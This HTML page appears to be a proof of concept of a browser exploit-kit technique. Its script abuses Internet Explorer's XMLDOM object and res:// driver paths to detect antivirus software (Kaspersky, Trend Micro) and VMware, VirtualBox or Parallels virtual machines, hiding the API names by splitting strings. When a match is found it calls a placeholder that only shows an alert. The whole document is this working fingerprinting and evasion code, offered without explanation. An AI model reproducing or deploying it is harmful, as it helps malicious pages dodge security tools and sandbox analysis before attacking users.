<html>
<body>
<script>

  function Target() {
      alert('Fired');
  }

  function gs7sfd(txt) {
      var v1 = 'XM' + 'LD' + 'OM',
          v2 = 'pa' + 'rseE' + 'rr' + 'or',
          v3 = 'loa' + 'dX' + 'ML',
          v4 = 'DT' + 'D X' + 'HTML 1.0 Transitional',
          v5 = 'err' + 'orC' + 'ode';
      var resInf = new ActiveXObject("Microsoft." + v1),
          subpath = "c:\\Windows\\System32\\drivers\\" + txt + ".sys";
      resInf.async = true;
      resInf[v3]('<!DOCTYPE html PUBLIC "-//W3C//' + v4 + '//EN" "res://' + subpath + '">');
      if (resInf[v2][v5] != 0) {
          var pe = resInf[v2],
              err = "Error Code: " + pe[v5] + "\n";
          err += "Error Reason: " + pe.reason;
          err += "Error Line: " + pe.line;
          if (err.indexOf("-2147023083") > 0) {
              return 1;
          } else {
              return 0;
          }
      }
      return 0;
  }

  var tmp;
  try {
      tmp = new ActiveXObject('Kaspersky.IeVirtualKeyboardPlugin.JavascriptApi.1');
  } catch (e) {
      tmp = false;
  }

  if (tmp || gs7sfd("kl1") || gs7sfd("tmactmon") || gs7sfd("tmcomm") || gs7sfd("tmevtmgr") || gs7sfd("TMEBC32") || gs7sfd("tmeext") || gs7sfd("tmnciesc") || gs7sfd("tmtdi") || gs7sfd("vm3dmp") || gs7sfd("vmusbmouse") || gs7sfd("vmmouse") || gs7sfd("vmhgfs") || gs7sfd("VBox Guest") || gs7sfd("VBoxMouse") || gs7sfd("VBoxSF") || gs7sfd("VBoxVideo") || gs7sfd("prl_boot") || gs7sfd("prl_fs") || gs7sfd("prl_kmdd") || gs7sfd("prl_memdev") || gs7sfd("prl_mouf") || gs7sfd("prl_pv32") || gs7sfd("prl_sound") || gs7sfd("prl_strg") || gs7sfd("prl_tg") || gs7sfd("prl_time"))
      Target();
</script>
</body>
</html>
